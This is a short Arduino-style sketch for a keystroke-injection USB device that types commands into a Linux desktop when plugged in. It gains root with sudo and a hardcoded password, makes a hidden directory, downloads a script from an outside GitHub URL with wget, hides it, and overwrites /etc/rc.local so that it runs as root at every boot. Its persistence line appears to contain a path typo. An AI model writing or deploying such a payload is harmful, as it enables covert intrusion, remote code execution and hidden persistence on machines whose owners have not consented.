#include <kb.h>

void setup()
{
  kb_init(KB_US);
  GUI;
  printKey("terminal");
  DELAY;
  ENTER;
  DELAY;
  printKey("sudo -i");
  DELAY;
  ENTER;
  printKey("nomel");
  DELAY;
  ENTER;
  printKey("cd /usr ; mkdir .hid ; cd .hid ; wget \"https://raw.githubusercontent.com/p4p1/A-life-time-in-code/master/bash/ch.x\"");
  DELAY;
  DELAY;
  ENTER;
  DELAY;
  printKey("mv ch.x .ch.x ; chmod 755 .ch.x ; echo -e \"#\x21/bin/sh -e \\n\\nsudo /usr/.hid.ch.x &\\n\\nexit 0\">/etc/rc.local");
  DELAY;
  ENTER;
  DELAY;
  printKey("exit");
  ENTER;
}

void loop()
{

}
